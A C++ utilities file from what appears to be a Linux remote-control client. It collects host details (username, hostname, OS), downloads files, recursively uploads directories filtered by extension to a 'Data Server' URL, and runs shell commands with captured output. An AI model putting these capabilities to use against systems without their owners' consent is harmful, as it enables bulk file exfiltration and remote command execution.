// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 



#include "utilities.h"
#include <sys/utsname.h>
#include <sys/stat.h>
#include <random>
#include <ctime>
#include <unistd.h>
#include <curl/curl.h>
#include <fstream>
#include "json.h"
#include <iostream>
#include <experimental/filesystem>
#include <cstring>
#include <unistd.h>
#include <sys/wait.h>
#include <pwd.h>
#include <iomanip>
#include <map>
#include <codecvt>
#include <iconv.h>

#define RANDOM_NUMBER_LENGTH    15

namespace fs = std::experimental::filesystem;

bool hasWritePermissionForDirectory(const std::wstring &dirPath){
    
    const std::wstring tmpFileName {L"fileXXXXxxxxx"};
    const std::wstring tmpFilePath = dirPath + L"/" + tmpFileName;
    std::ofstream tmpFile;
    tmpFile.open(fs::path(tmpFilePath));
    
    if(tmpFile.is_open()){              // Check for write permissions on destination directory before downloading files to it
        tmpFile.close();
        std::error_code ec;
        fs::remove(tmpFilePath, ec);    // Remove the temporary created file
        return true;
    }
    return false;
}

std::wstring changeDir(const std::wstring& newPath, std::error_code& ec) {
    fs::path newDirectory(newPath);
    if (fs::exists(newDirectory, ec) && fs::is_directory(newDirectory, ec)) {
        fs::current_path(newDirectory, ec); // Change the current directory to newPath
        if (!ec) {
            return fs::current_path().wstring(); // Return the new current directory path
        }
    }
    return L""; // Return an empty string if there was an error
}

std::string ws2s(const std::wstring& wstr) {

    using convert_typeX = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_typeX, wchar_t> converterX;

    return converterX.to_bytes(wstr);
}

std::wstring s2ws(const std::string& str) {

    using convert_typeX = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_typeX, wchar_t> converterX;

    return converterX.from_bytes(str);
}

std::string convertWStringToUTF8(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> utf8_converter;
    return utf8_converter.to_bytes(wstr);
}

std::wstring extractFilename(const std::wstring& filePath) {
    size_t lastSlash = filePath.find_last_of(L"/\\"); // Find the last slash or backslash
    if (lastSlash != std::wstring::npos) {
        return filePath.substr(lastSlash + 1); // Extract the filename part
    }
    return filePath; // If no slashes or backslashes found, return the original path as the filename
}

std::wstring ExtractLastDirectoryName(const std::wstring& path) {
    std::wstringstream ss(path);
    std::wstring directory;
    std::wstring lastDirectory;
    while (std::getline(ss, directory, L'/')) {
        if (!directory.empty()) {
            lastDirectory = directory;
        }
    }
    return lastDirectory;
}

bool isExecutable(const std::wstring& path) {
    // Convert the wide string to a narrow string using wcstombs
    std::string narrowPath(path.begin(), path.end());

    struct stat fileInfo;
    if (stat(narrowPath.c_str(), &fileInfo) != 0) {
        std::cerr << "Error getting file info." << std::endl;
        return false;
    }

    // Check if the file is a regular file and has execute permission for user
    if (S_ISREG(fileInfo.st_mode) && (fileInfo.st_mode & S_IXUSR)) {
        return true;
    }

    return false;
}

size_t calculateDirectorySize(const std::string& path) {
    size_t size = 0;
    std::error_code ec;
    
    for (const auto & entry : fs::directory_iterator(path, fs::directory_options::skip_permission_denied, ec)) {
        auto fileType = fs::status(entry, ec).type();
        if (!ec) {                
            if (fileType == fs::file_type::regular)
                size += fs::file_size(entry.path(), ec);
            else if (fileType == fs::file_type::directory) {
                size_t subDirectorySize = calculateDirectorySize(entry.path());
                if (subDirectorySize == static_cast<size_t>(-1)) {
                    //std::cout << "Couldn't evaluate" << std::endl;
                    return static_cast<size_t>(-1);  // Return an error state
                }
                size += subDirectorySize;
            }
        } 
        else {
            return static_cast<size_t>(-1);  // Return an error state
        }       
    }
    return size;
}

std::wstring getComputerName() {
    char computerName[HOST_NAME_MAX] = {};
    if (gethostname(computerName, sizeof(computerName)) != 0) {
        perror("gethostname");
        return L""; // Handle the error accordingly, returning an empty wstring in this case
    }
    return std::wstring_convert<std::codecvt_utf8<wchar_t>>().from_bytes(computerName);
}

std::wstring getUserName()
{
  uid_t uid = geteuid();
  struct passwd *pw = getpwuid(uid);
  if (pw)
  {
    return s2ws(pw->pw_name);
  }
  return {};
}

std::string generateRandomAlphanumeric(int length, long long seed) {
    std::string alphanumeric = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::mt19937_64 rng(seed);
    std::uniform_int_distribution<int> dist(0, alphanumeric.length() - 1);

    std::string result;
    for (int i = 0; i < length; ++i) {
        result += alphanumeric[dist(rng)];
    }
    return result;
}

std::wstring getSysInfo() {
    std::vector<std::wstring> data_vec;
    std::wstring computerName = getComputerName(); // Use a wide string version of getComputerName

    // Generate the seed from time and computer name
    std::time_t currentTime = std::time(nullptr);

    std::wstring seedString = std::to_wstring(currentTime) + computerName;
    std::hash<std::wstring> seedHash;
    long long seed = static_cast<long long>(seedHash(seedString));

    // Generate a random alphanumeric number
    std::wstring randomAlphanumeric = s2ws(generateRandomAlphanumeric(RANDOM_NUMBER_LENGTH, seed)); // Use a wide string version of generateRandomAlphanumeric

    data_vec.push_back(L"id");
    data_vec.push_back(randomAlphanumeric);

    std::wstring username = getUserName(); // Use a wide string version of getUserName

    struct utsname sysInfo;
    if (uname(&sysInfo) == 0);
    else { // Couldn't retrieve sysInfo
        memset(&sysInfo, 0x00, sizeof(struct utsname));
    }

    data_vec.push_back(L"username");
    data_vec.push_back(username);
    data_vec.push_back(L"computerName");
    data_vec.push_back(computerName);
    data_vec.push_back(L"OSname");
    data_vec.push_back(s2ws(sysInfo.sysname));
    data_vec.push_back(L"OSversion");
    data_vec.push_back(s2ws(sysInfo.version).substr(0, 19));

    return to_json(data_vec);
}

std::string extractBase64Data(const std::wstring& buff) {
    std::size_t found = buff.find(L"\r\n\r\n");
    if (found != std::wstring::npos) {
        found += std::wstring(L"\r\n\r\n").length();
        return ws2s(buff.substr(found));
    }
    else {
        return std::string("");
    }
}

std::vector<std::string> extract_items_from_str(const std::string &input_str, const std::string &delimiter) {

    std::string str(input_str);
    // Extract strings using a delimiter
    size_t pos = 0;
    std::string token;
    std::vector<std::string> items;

    while ((pos = str.find(delimiter)) != std::string::npos) {
        items.push_back(str.substr(0, pos));
        str.erase(0, pos + delimiter.length());
    }
    items.push_back(str.data());

    return items;
}

std::wstring ReplaceTildeWithPath(const std::wstring& filePath) {
    std::wstring result = filePath;
    size_t tildePos = result.find('~');
    if (tildePos != std::string::npos) {
        std::wstring homeDir = L"/home/" + getUserName(); //+ "/";
        result.replace(tildePos, 1, homeDir);
    }
    return result;
}

size_t WriteData(void* buffer, size_t size, size_t nmemb, void* userp) {
    std::ofstream* file = static_cast<std::ofstream*>(userp);
    file->write(static_cast<const char*>(buffer), size * nmemb);
    return size * nmemb;
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    return size * nmemb;
}

bool isDataServerAvailable(const std::string& url) {
    CURL* curl = curl_easy_init();
    if (!curl) {
        // std::cerr << "Curl initialization failed." << std::endl;
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L); // Suppress output

    CURLcode res = curl_easy_perform(curl);
    long responseCode;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &responseCode);

    curl_easy_cleanup(curl);

    if (res == CURLE_OK && responseCode == 200) {
        return true;  // Port is open and responded with a 200 OK.
    }

    return false;  // Port is either closed or didn't respond as expected.
}

bool DownloadFileFromURL(const std::wstring& url, const std::wstring& outputDirPath) {

    CURL* curl = curl_easy_init();
    if (!curl) {
        //std::cerr << "Failed to initialize libcurl" << std::endl;
        return false;
    }
    std::wstring outputFilePath = outputDirPath + L"/" + url.substr(url.find_last_of(L'/') + 1);
    std::ofstream outputFile(fs::path(outputFilePath), std::ios::binary);
    if (!outputFile) {
        std::wcerr << "Failed to open output file: " << outputFilePath << std::endl;
        curl_easy_cleanup(curl);
        return false;
    }
    std::string url_stdstring = ws2s(url);

    curl_easy_setopt(curl, CURLOPT_URL, url_stdstring.c_str());
    curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteData);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outputFile);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L); // Suppress output

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        std::wcerr << "Failed to download file: " << curl_easy_strerror(res) << std::endl;
        curl_easy_cleanup(curl);
        outputFile.close();
        std::error_code ec;
        fs::remove(outputFilePath.c_str(), ec);  // Remove the partially downloaded file
        return false;        
    }
    curl_easy_cleanup(curl);
    outputFile.close();
    return true;
}

bool DownloadDirectoryFromURL(const std::wstring& url, const std::wstring& outputDirPath) {
    
    // To be implemented Later
    
    return false;
}

bool UploadFileToURL(const std::wstring& url, const std::wstring& filePath) {

    // Open the file for reading
    std::ifstream fileStream(fs::path(filePath), std::ios::binary);
    if (!fileStream.is_open()) {
        // Handle file opening failure
        return false;
    }
    // Get the file size
    fileStream.seekg(0, std::ios::end);
    std::streampos fileSize = fileStream.tellg();

    if (fileSize == 0) { return false; } // Don't proceed if size is ZERO

    fileStream.seekg(0, std::ios::beg);

    // Allocate memory for the file content
    std::vector<char> fileBuffer(fileSize);

    // Read the file content into the buffer
    if (!fileStream.read(fileBuffer.data(), fileSize)) {
        // Handle file reading failure
        return false;
    }
    fileStream.close();

    // Extract file name
    std::wstring filename = extractFilename(filePath);

    // Convert the wstring filename to UTF-8 encoded C-style string
    std::string filenameUtf8 = convertWStringToUTF8(filename);

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl_easy_init() failed!" << std::endl;
        return false;
    }
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L); // Suppress output
    struct curl_httppost* formPost = nullptr;
    struct curl_httppost* lastPtr = nullptr;

    CURLFORMcode formAddResult = curl_formadd(&formPost, &lastPtr,
        CURLFORM_COPYNAME, "file",
        CURLFORM_BUFFER, filenameUtf8.c_str(),
        CURLFORM_BUFFERPTR, fileBuffer.data(),
        CURLFORM_BUFFERLENGTH, fileBuffer.size(),
        CURLFORM_END);

    if (formAddResult != CURL_FORMADD_OK) {
    //    errorMsg = L"Failed to add form data: " + s2ws(curl_easy_strerror((CURLcode)formAddResult));
        std::wcerr << L"Failed to add form data: " << s2ws(curl_easy_strerror((CURLcode)formAddResult)) << std::endl;
        curl_easy_cleanup(curl);
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_HTTPPOST, formPost);
    curl_easy_setopt(curl, CURLOPT_URL, ws2s(url).c_str());

   // Capture server response [ If not used, the CURL will prompts the server response on STDOUT ]
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        curl_easy_cleanup(curl);
        return false;
    }
    curl_easy_cleanup(curl);
    return true;
}

bool UploadDirectoryToURL(const std::wstring& url, const std::wstring& dirPath, std::wstring &errorMsg, const std::wstring& extensions) {

    if(!isDataServerAvailable(ws2s(url))){
        errorMsg = L"Couldn't connect to Data Server i.e " + url;
        return false;
    }
    std::vector<std::wstring> filesToUpload;
    std::vector<std::string> extensions_vec = extract_items_from_str(ws2s(extensions),",");
    std::error_code ec;
    for (const auto& entry : fs::recursive_directory_iterator(dirPath, fs::directory_options::skip_permission_denied, ec)) {
        fs::status(entry, ec).type();    // To get error_code status
        if(!ec) {
            if (fs::is_regular_file(entry, ec)) {            
                std::wstring filePath = entry.path().wstring();
                if (extensions.empty()) {
                    filesToUpload.push_back(filePath);
                } 
                else {
                    std::string extension = entry.path().extension().string();                
                    for(auto ext : extensions_vec){                
                        if(ext == extension){ 
                            filesToUpload.push_back(filePath);
                            break;
                        }
                    }
                }
            }
        }
        else { return false; }       
    }
    for (const auto& filePath : filesToUpload) {
        UploadFileToURL(url, filePath);
    }  
    return true;
}

/*
std::string executeCommand(const std::string& shellType, const std::string& command, const std::string& args) {
    // Create a pipe for IPC
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return "";
    }
    // Fork the process
    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        return "";
    } 
    else if (pid == 0) {    // Child process
        // Close the read end of the pipe
        close(pipefd[0]);

        // Redirect stdout/stderr to the write end of the pipe
        if(dup2(pipefd[1], STDOUT_FILENO) == -1){
            return std::string("Redirection of stdout to pipe for child process failed");
            //exit(-1);
        }
        if(dup2(pipefd[1], STDERR_FILENO) == -1){
            return std::string("Redirection of stderr to pipe for child process failed");
            //exit(-1);
        }
        std::string fullCommand = command + " " + args;
        int retValue;

        // Extract the parent environment variables
        extern char** environ;
        std::vector<char*> envVariables;
        for (char** env = environ; *env != nullptr; ++env) {
            envVariables.push_back(*env);
        }
        envVariables.push_back(nullptr); // Null-terminate the array

        if(shellType.empty()){      // This branch is used to execute a program 

            // Tokenize the args string by spaces and store in a vector of strings           
            std::vector<std::string> argVector;
            size_t startPos = 0;
            size_t endPos = fullCommand.find(' ');

            while (endPos != std::string::npos) {
                argVector.push_back(fullCommand.substr(startPos, endPos - startPos));
                startPos = endPos + 1;
                endPos = fullCommand.find(' ', startPos);
            }
            argVector.push_back(fullCommand.substr(startPos));

            // Convert the vector of strings into an array of C-style strings (const char*)
            std::vector<const char*> argv;
            for (const auto& arg : argVector) {
                argv.push_back(arg.c_str());
            }
            argv.push_back(nullptr); // Null-terminate the array
            const char** execArgs = &argv[0];

            if(args.empty()) { 
                execArgs = nullptr;
            }
            retValue = execve(command.c_str(), const_cast<char* const*>(execArgs), envVariables.data());          
        }
        else{   // Execute command on the supplied shell e.g. (/bin/sh)
            // Execute the command
            std::vector<char*> shell = {strdup(shellType.c_str()), strdup("-c"), strdup(fullCommand.c_str()), nullptr};
            retValue = execve(shellType.c_str(), shell.data(), envVariables.data());   
        }
        if(retValue == -1){     // check for execve(..) error
            char buff[50];
            std::cout << "execute: " + fullCommand + " returns : " + strerror_r(errno, buff, sizeof(buff));
        }       
    }
    else {
        // Parent process

        // Close the write end of the pipe
        close(pipefd[1]);

        // Read the output from the pipe
        char buffer[1024];
        std::string output;
        ssize_t bytesRead;
        while ((bytesRead = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
        // Append the output to the string
            output.append(buffer, bytesRead);
        }

        // Close the read end of the pipe
        close(pipefd[0]);

        // Wait for the child process to exit
        int status;
        waitpid(pid, &status, 0);

        if (WIFEXITED(status)) {
            int exitStatus = WEXITSTATUS(status);
            output += " | Child process exited with status: " + std::to_string(exitStatus);
        } else if (WIFSIGNALED(status)) {
            int signalNumber = WTERMSIG(status);
            output += " | Child process terminated due to signal: " + std::to_string(signalNumber);  // Should be removed from final executable as it will not be transmitted to CRC
        }
        return output;
    }
}
*/

std::wstring executeCommand(const std::wstring& shellType, const std::wstring& command, const std::wstring& args) {

    // Create a pipe for IPC
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return L"";
    }
    // Fork the process
    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        return L"";
    } 
    else if (pid == 0) {    // Child process
        // Close the read end of the pipe
        close(pipefd[0]);

        // Redirect stdout/stderr to the write end of the pipe
        if(dup2(pipefd[1], STDOUT_FILENO) == -1){
            return L"Redirection of stdout to pipe for child process failed";
        }
        if(dup2(pipefd[1], STDERR_FILENO) == -1){
            return L"Redirection of stderr to pipe for child process failed";
        }
        std::wstring fullCommand = command + L" " + args;
        int retValue;

        // Extract the parent environment variables
        extern char** environ;
        std::vector<char*> envVariables;
        for (char** env = environ; *env != nullptr; ++env) {
            envVariables.push_back(*env);
        }
        envVariables.push_back(nullptr); // Null-terminate the array

        if(shellType.empty()){      // This branch is used to execute a program 
            const char** execArgs = nullptr;
            retValue = execve(wstring_to_utf8(command).c_str(), const_cast<char* const*>(execArgs), envVariables.data());          
        }
        else{   // Execute command on the supplied shell e.g. (/bin/sh)
            // Execute the command
            std::vector<char*> shell = {strdup(wstring_to_utf8(shellType).c_str()), strdup("-c"), strdup(wstring_to_utf8(fullCommand).c_str()), nullptr};
            retValue = execve(wstring_to_utf8(shellType).c_str(), shell.data(), envVariables.data());   
        }
        if(retValue == -1){     // check for execve(..) error
            char buff[50];
            std::wcout << L"execute: " + fullCommand + L" returns : " + s2ws(strerror_r(errno, buff, sizeof(buff)));
        }       
        exit(retValue);
    }
    else {           // Parent process       
        // Close the write end of the pipe
        close(pipefd[1]);

        // Read the output from the pipe
        char buffer[1024];
        std::wstring output;
        ssize_t bytesRead;

        // Create an iconv converter
        iconv_t conv = iconv_open("WCHAR_T", "UTF-8");
        if (conv == (iconv_t)-1) {
            perror("iconv_open");
            return L"iconv_open error!";
        }

        while ((bytesRead = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
            // Convert the input buffer from UTF-8 to wide characters
            char* inbuf = buffer;
            size_t inbytesleft = bytesRead;
            size_t outbytesleft = sizeof(buffer) * 4; // Wide characters can take up to 4 bytes

            char outbuf[4096]; // Adjust the buffer size as needed
            char* outptr = outbuf;

            if (iconv(conv, &inbuf, &inbytesleft, &outptr, &outbytesleft) == (size_t)-1) {
                perror("iconv");
                break;
            }

            // Calculate the number of wide characters
            size_t numWChars = (sizeof(buffer) * 4 - outbytesleft) / sizeof(wchar_t);

            if (numWChars > 0) {
                output.append(reinterpret_cast<wchar_t*>(outbuf), numWChars);
            }
        }

        // Close the iconv converter
        iconv_close(conv);

        // Close the read end of the pipe
        close(pipefd[0]);

        // Wait for the child process to exit
        int status;
        waitpid(pid, &status, 0);

        if (WIFEXITED(status)) {
            int exitStatus = WEXITSTATUS(status);
            std::wstringstream ss;
            ss << L" | Child process exited with status: " << exitStatus;
            output += ss.str();
        } else if (WIFSIGNALED(status)) {
            int signalNumber = WTERMSIG(status);
            std::wstringstream ss;
            ss << L" | Child process terminated due to signal: " << signalNumber;
            output += ss.str();
        }
        return output;
    }
}